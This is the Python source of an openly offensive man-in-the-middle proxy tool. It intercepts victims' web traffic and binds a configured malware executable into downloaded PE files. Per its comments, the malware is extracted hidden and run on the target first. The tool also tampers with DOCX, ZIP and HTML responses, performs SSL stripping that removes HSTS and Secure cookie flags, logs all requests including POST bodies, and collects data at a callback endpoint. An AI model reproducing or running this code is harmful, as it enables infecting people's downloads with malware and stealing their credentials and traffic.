#!/usr/bin/python
__author__ = "Leonardo Nve"
__email__  = "leonardo.nve@gmail.com"

from twisted.web import http
from twisted.internet import reactor, protocol, ssl
from twisted.internet.protocol import ClientFactory
from twisted.python import log

from os import popen
import sys
import argparse
import json
# Handlers
from Handlers import PEBinder
from Handlers import DOCXHandler
from Handlers import ZIPHandler
from Handlers import HTMLHandler
from urllib   import urlencode
import inspect
import re

getInfoparam = '/clientpGetImage'
getInfoLen = 0-len(getInfoparam)

bad_headers = ['alternate-protocol', 'content-md5', 'strict-transport-security']

def lineno():
    """Returns the current line number in our program."""
    return inspect.currentframe().f_back.f_lineno

def log2file(cad):
    with open("log.txt", "a") as f:
        f.write(cad)
    return

class Handle():
    type = None
    handle = None
    contentlength = 0

    def __init__(self, headers, uri, buffer, active_sslstrip_param = False):
        if "content-length" in headers:
            self.contentlength = int(headers["content-length"])

        # if 'content-type' in headers:
        #     print '[--] Content-type', headers['content-type']

        if html_config:
            if HTMLHandler.HTMLCheck(headers, uri):
                self.handle = HTMLHandler.HTMLHandler(html_config, headers, uri, active_sslstrip_param)
                self.type = 'html'
                # print 'Handling a html file'
                sys.stdout.flush()
                return

        if exe_file:
            if PEBinder.PECheck(headers, uri, buffer) :
                self.handle = PEBinder.PEHandler(exe_file)
                self.type = 'pe'
                print 'Handling a PE file'
                sys.stdout.flush()
                return

        if ooxml_config:
            if DOCXHandler.OOXMLCheck(headers, uri):
                self.handle = DOCXHandler.DOCXHandler(ooxml_config, headers, uri)
                self.type = 'ooxml'
                print 'Handling a ooxml file'
                sys.stdout.flush()
                return

        if zip_config:
            if ZIPHandler.ZIPCheck(headers, uri, buffer):
                self.handle = ZIPHandler.ZIPHandler(zip_config, headers, uri)
                self.type = 'zip'
                print 'Handling a zip file'
                sys.stdout.flush()
                return
        return

    '''
        Llama al Bind del handle si es que hay.
        Respuesta (proviene del Bind si hay handle):
            Datos a enviar (modificados o no)
            Nuevo content-length
            Padding necesario despues
    '''
    def manage_data(self, data):
        if self.handle is None:
            return data, self.contentlength, 0
        sys.stdout.flush()
        return self.handle.Bind(data, len(data), contentlength=self.contentlength)

    '''
        Gestiona a la llamada del Padding del Handler
        Respuesta (viene de la funcion Padding si hay handle):
            Datos a enviar o None si no es necesario
    '''
    def final_data(self):
        if self.handle is None:
            return None
        return self.handle.Padding()

class ProxyClient(http.HTTPClient):
    """ The proxy client connects to the real server, fetches the resource and
    sends it back to the original client, possibly in a slightly different
    form.
    """
    newcontentlen = None
    setcookie = ''
    handleResponsePartCalled = False
    # Parametro headers del request
    statusReq = None
    infoRecv = False
    def __init__(self, method, uri, postData, headers, originalRequest):
        self.method = method
        self.uri = uri
        self.postData = postData
        self.headers = headers
        self.originalRequest = originalRequest
        self.contentLength = None
        self.len_buffer = 0
        self.new_headers = {}
        self.handler = None
        self.host = originalRequest.requestHeaders.getRawHeaders('host')[0]
        self.statusReq = '[++] Navigation: http://' + self.host + uri
        self.infoRecv = (getInfoparam == uri[getInfoLen:])
        self.active_sslstrip = active_sslstrip and (sslstrip_handler.check_host(self.host, onlycheck = True) is not None) and not self.infoRecv
        # print '[--] ProxyClient originalRequest: ', json.dumps(originalRequest.__dict__,sort_keys=True, indent=4)


# Manejadores del REQUEST
    def sendRequest(self):
        # log.msgsg("Sending request: %s %s" % (self.method, self.uri))
        self.sendCommand(self.method, self.uri)

    def sendHeaders(self):
        # print '[--] INIT sendHeaders:'
        for key, values in self.headers:
            # print key,': ',values
            lkey = key.lower()
            if lkey == 'connection':
                values = ['close']
            elif lkey == 'keep-alive':
                next

            # if key.lower() == 'host':
            #     print 'Host: ',values[0]

            for value in values:
                self.sendHeader(key, value)
        self.endHeaders()

    def sendPostData(self):
        # log.msgsg("Sending POST data")
        self.transport.write(self.postData)
 
    def connectionMade(self):
        # log.msgsg("HTTP connection made")
        self.sendRequest()
        self.sendHeaders()
        if self.method == 'POST':
            self.sendPostData()

    def handleStatus(self, version, code, message):
        # log.msgsg("Got server response: %s %s %s" % (version, code, message))
        if self.infoRecv:
            self.originalRequest.setResponseCode(408, "Server Timeout")
            print '[+++] Info received: ', json.dumps(self.originalRequest.__dict__['args'],sort_keys=True, indent=4)
            return

        self.originalRequest.setResponseCode(int(code), message)
        self.statusReq = self.statusReq + '\t%s %s' % (code, message)
        print self.statusReq
        
    def parse_set_cookie_str(self, setcookie, predomain = None):
        parametros = setcookie.split(';')
        setkeys = []
        expires = None
        path    = None
        domain  = None
        max_age = None
        for param in parametros:
            keys= param.split('=',1)
            key = keys[0]
            if len(keys)>1: 
                valor = keys[1]
            else:
                valor = None

            lkey = key.lower()

            if lkey[-7:] == 'expires':
                expires = valor
            elif lkey[-7:] == 'max-age':
                max_age = valor
            elif lkey[-4:] == 'path':
                path = valor
            elif lkey[-6:] == 'domain':
                if predomain is not None:
                    domain = predomain
                else:
                    domain = valor
            elif lkey == 'xxxxxx':
                pass
            elif re.search('(httponly)|((\s*secure)((?!\S)|;))',lkey):
                pass
            else:
                if key!='':
                    setkeys.append((key,valor))

        for key,valor in setkeys:
            self.originalRequest.addCookie(key, valor, expires = expires, domain = domain, path = path, max_age = max_age)
            # print '[--] Added cookie',key
                

    def handleHeader(self, key, value):
        # print '[--] handleHeader: ',key,value
        lkey = key.lower()
        if self.active_sslstrip:
            # print '[--] handleHeader ', sslstrip_handler.check_host(self.host)
            if lkey in bad_headers:#or lkey[:21] == 'access-control-allow-':
                return
            # if lkey == 'content-security-policy':
            #     value = 'default-src *; script-src *; style-src *; object-src *; '
            #     self.originalRequest.responseHeaders.addRawHeader(key, value)
            #     return

            value = sslstrip_handler.response_string_sslstrip(value)
            if lkey == 'set-cookie':
                #print '[--] Removing Secure flag: ',headers[key]
                setcookie = HTMLHandler.secure_regex.sub(';xxxxxx;',value)
                self.parse_set_cookie_str(setcookie)
                return

        if lkey in self.new_headers:
            self.new_headers[lkey] = self.new_headers[lkey]+'; '+value # Si el header ya estaba, se agrega el valor al final con ;
        else:
            self.new_headers[lkey] = value
        # print ">> %s: %s"%(key,value)
        if lkey == 'content-length':
            self.contentLength = value
        else:
            self.originalRequest.responseHeaders.addRawHeader(key, value)

    def handleResponsePart(self, buffer):
        if self.infoRecv:
            return
        # print '[--] handleResponsePart called'
        if self.handler is None:
            self.handler = Handle(self.new_headers, self.uri, buffer, active_sslstrip_param = self.active_sslstrip)
            self.handleResponsePartCalled = True

        buffer2, newc, padding_len = self.handler.manage_data(buffer)

        if self.newcontentlen is None and newc > 0:
            self.newcontentlen = newc
            self.new_headers['content-length'] = newc
            self.originalRequest.responseHeaders.addRawHeader('content-length', newc)
            # proxy.ProxyClient.handleHeader(self, "Content-Length", self.newcontentlen)
        sys.stdout.flush()
        lenb = len(buffer2)
        # print '[--] Buffer intermedio: ',lenb
        if lenb > 0:
            self.len_buffer += lenb
            #print '>> New packet processed Old (%d bytes)\tNew (%d bytes)\tContent-Length: %d\tWrited: %d'%(len(buffer), lenb, self.newcontentlen,self.len_buffer)
            http.HTTPClient.handleResponsePart(self, buffer2)
            self.originalRequest.write(buffer2)

            if (self.len_buffer + padding_len) == self.newcontentlen:
                buffer3 = self.handler.final_data()
                if buffer3 is not None:
                    # print ">> Buffer padding: %d"%len(buffer3)
                    http.HTTPClient.handleResponsePart(self, buffer3)
                    self.originalRequest.write(buffer3)
            sys.stdout.flush()

    def handleResponse(self, data):
        
        if self.infoRecv:
            datos = '<html><body></body></html>'
            sys.stdout.flush()
            self.originalRequest.write(datos)
        else:   
            if not self.handleResponsePartCalled:
                self.handler = Handle(self.new_headers, self.uri, buffer, active_sslstrip_param = self.active_sslstrip)
            datos = ''
            if self.active_sslstrip:
                # print '[--] handleResponse ', sslstrip_handler.check_host(self.host)
                if self.host in HTMLHandler.host_set_cookies:
                    cookies = HTMLHandler.host_set_cookies[self.host][0]
                    redirected_host = HTMLHandler.host_set_cookies[self.host][1]

                    self.originalRequest.setResponseCode(302, 'Redirection')
                    self.originalRequest.setHeader('Location', str(redirected_host))
                    #self.originalRequest.removeHeader('set-cookie')
                    self.parse_set_cookie_str(cookies)
                    # self.originalRequest.setHeader('Set-Cookie', str(cookies))
                    datos = ''
                    self.originalRequest.write(datos)
                    try:
                        self.originalRequest.finish()
                        self.transport.loseConnection()
                    except Exception, e:
                        print lineno(),' Exception: %s (%s)' % (Exception, e)

                    del HTMLHandler.host_set_cookies[self.host]
                    return

                    headers,cookies = sslstrip_handler.sslstrip_response_headers(self.new_headers)
                    
                    for key in headers:
                        self.originalRequest.setHeader(key, headers[key])

            if self.handler is not None:

                if self.handler.type == 'html':
                    # print '[--]',lineno(),' Accediendo a parseos.....'
                    datos, redir = self.handler.handle.Final(self.host, self.postData,self.originalRequest.__dict__)
                    if redir is not None:
                        self.originalRequest.setResponseCode(302, 'Redirection')
                        self.originalRequest.setHeader('Location', redir)
                        # print '[--] datos: ',datos

                    self.originalRequest.setHeader('Content-Length', len(datos))
                    # if redir:
                    #     print '[--] ProxyClient originalRequest (after redir):\n', self.originalRequest.__dict__
                    sys.stdout.flush()
                    self.originalRequest.write(datos)
                    #log2file('\n'+str(headers)+'\n\n'+datos)
                    
        try:
            self.originalRequest.finish()
            self.transport.loseConnection()
        except Exception, e:
            pass
            # print lineno(),' Exception: %s (%s)' % (Exception, e)      

class ProxyClientFactory(protocol.ClientFactory):
    def __init__(self, method, uri, postData, headers, originalRequest):
        self.protocol = ProxyClient
        self.method = method
        self.uri = uri
        self.postData = postData
        self.headers = headers
        self.originalRequest = originalRequest

    def buildProtocol(self, addr):
        return self.protocol(self.method, self.uri, self.postData,
                             self.headers, self.originalRequest)

    def clientConnectionFailed(self, connector, reason):
        log.err("Server connection failed: %s" % reason)
        self.originalRequest.setResponseCode(504)
        try:
            self.originalRequest.finish()
        except:
            pass

class ProxyRequest(http.Request):
    def __init__(self, channel, queued, reactor=reactor):
        http.Request.__init__(self, channel, queued)
        self.reactor = reactor

    def process(self):
        host = self.getHeader('host')
        inicial_host = host
        #self.requestHeaders.removeHeader('accept')
        self.requestHeaders.removeHeader('accept-encoding')
        self.requestHeaders.removeHeader('if-modified-since')
        self.requestHeaders.removeHeader('if-none-match')
        #self.requestHeaders.setHeader('Connection','close')
                
        if not host:
            log.err("No host header given")
            self.setResponseCode(400)
            self.finish()
            return

        port = 80

        if ':' in host:
            host, port = host.split(':')
            port = int(port)

        if self.uri.startswith('http://'):
            self.uri = self.uri[len('http://'+host):]

        self.content.seek(0, 0)
        postData = self.content.read()

        if active_sslstrip:
            headers = dict(self.requestHeaders.getAllRawHeaders())
            #dominio = host.split('.')[-2]+'.'+host.split('.')[-1]
            host, port, self.uri, postData, headers = sslstrip_handler.Modify_Request(self.uri, host, postData, headers)
            # print 'New host = ',host
            lpostData =  postData.lower()

        # self.setHost(host, port)
        
        # for key in headers:
        #     self.requestHeaders.addRawHeader(key, headers[key])

        cad = "%s %s HTTP/1.1\n" % (self.method, self.uri)
        for header in self.requestHeaders.getAllRawHeaders():
            cad += "%s: %s\n" % (header[0], header[1][0])

        cad += "\n" + postData + "\n\n"

        log2file(cad)

        factory = ProxyClientFactory(self.method, self.uri, postData,
                                     self.requestHeaders.getAllRawHeaders(),
                                     self)

        if port == 80:
            
            if invisibleProxy is not None:
                phost,pport = invisibleProxy.split(':')
                # print '[++] Conexion por HTTP [Proxy] (%s,%d)' % (host, port)
                self.reactor.connectTCP(phost, int(pport), factory)
            else:
                # print '[++] Conexion por HTTP (%s,%d)' % (host, port)
                self.reactor.connectTCP(host, 80, factory)
        else:
            
            clientContextFactory       = ssl.ClientContextFactory()
            # connectionFactory          = ServerConnectionFactory(self.method, self.uri, postData, self.requestHeaders.getAllRawHeaders(), self)
            # #connectionFactory.protocol = SSLServerConnection
            # self.reactor.connectSSL('127.0.0.1', 8080, factory, clientContextFactory) # invisible proxy
            if invisibleProxy is not None:
                phost,pport = invisibleProxy.split(':')
                # print '[++] Conexion por SSL [Proxy] (%s,%d)' % (host,port)
                self.reactor.connectSSL(phost,int(pport), factory, clientContextFactory)
            else:
                # print '[++] Conexion por SSL (%s,%d)' % (host,port)
                self.reactor.connectSSL(host, port, factory, clientContextFactory)

    def processResponse(self, data):
        return data

class TransparentProxy(http.HTTPChannel):
    requestFactory = ProxyRequest

class ProxyFactory(http.HTTPFactory):
    protocol = TransparentProxy

parser = argparse.ArgumentParser()
parser.add_argument("-p", "--port", help="Listen port", type=int, default=9090)
parser.add_argument("-e", "--exe", help="EXE binder configuration", default = None)
parser.add_argument("-o", "--ooxml", help="OOXML config")
parser.add_argument("-z", "--zip", help="ZIP config")
parser.add_argument("-t", "--html", help="HTML config", default = None)
parser.add_argument("-T", "--sslstrip", help="Activate SSLStrip2 (must provide html config)", action="store_true", default=False)
parser.add_argument("-S","--silent", help="Silent", action="store_true", default=False)
parser.add_argument("-P","--invisibleProxy", help="Proxy:port", default=None)
args = parser.parse_args()
ooxml_config = args.ooxml
zip_config = args.zip
html_config = args.html
pe_config = args.exe
exe_file = None
invisibleProxy = args.invisibleProxy
active_sslstrip = (args.sslstrip and html_config is not None)

if active_sslstrip:
    sslstrip_handler = HTMLHandler.HTMLHandler(html_config, None, None, True)


if pe_config is not None:
    pconfig = json.loads(open(pe_config).read())

    exe_file  = pconfig["output"]
    launcher  = pconfig["launcher"]
    malware   = pconfig["malware"]
    path_malw = pconfig["path_malware"]
    path_orig = pconfig["path_original"]
    joiner    = pconfig["joiner"]

    if not launcher == "" and not malware=="":
        comando = joiner + " -l " + launcher + " -m " + malware

        if not exe_file == "":
            comando += " -o " + exe_file
        else:
            exe_file = "output.exe"

        if not path_malw == "":
            comando += " -p " + path_malw

        if not path_orig == "":
            comando += " -s " + path_orig

        print "Creating injector... "
        print comando

        p = popen(comando,"r")
        for line in p.readlines():
            print line,
        print

      # "HELP"    : {
      #        "launcher"      : " Ruta al launcher ",
      #        "output"        : " Ruta local del fichero generado launcher + malware ",
      #        "malware"       : " Ruta al ejecutable que se ejecutara primero (malware) ",
      #        "path_malware"  : " Ruta + nombre_archivo donde se extraera y ejecutara malware en el sistema objetivo (el archivo se creara oculto)",
      #        "path_original" : " Ruta + nombre_archivo donde se extraera y ejecutara el fichero original en el sistema objetivo (el archivo se creara oculto)",
      #        "HELP"          : " Esta ayuda "
      # }


if not args.silent:
    log.startLogging(sys.stdout)

reactor.listenTCP(args.port, ProxyFactory())
reactor.run()